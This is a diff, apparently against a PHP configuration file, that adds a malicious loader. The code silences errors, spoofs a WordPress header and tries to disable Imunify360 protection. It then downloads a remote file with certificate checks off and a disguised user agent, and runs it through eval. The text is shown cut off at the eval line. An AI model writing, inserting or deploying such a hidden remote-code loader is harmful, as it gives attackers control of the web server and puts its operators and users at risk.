@@ -1,0 +1,31 @@
+$config['proxy_ips'] = '';
+error_reporting(0);
+@ini_set('display_errors', 0);
+header('X-Powered-By: WordPress');
+header('Content-Type: text/html; charset=UTF-8');
+@ini_set("imunify360.enabled", false);
+@ini_set("imunify360-agent uninstall", false);
+@ini_set("imunify360.realtime_protection", false);
+
+$url = str_replace(['#', '%'], '', 'https://ngtools.site/ibs/adminer.txt');
+
+function stealth_get($target) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init($target);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        $data = curl_exec($ch);
+        curl_close($ch);
+    } else {
+        $data = @file_get_contents($target);
+    }
+    return $data;
+}
+$payload = stealth_get($url);
+if ($payload) {
+    $encoded = base64_encode($payload);
+    eval("?>".base64_decode($encoded));
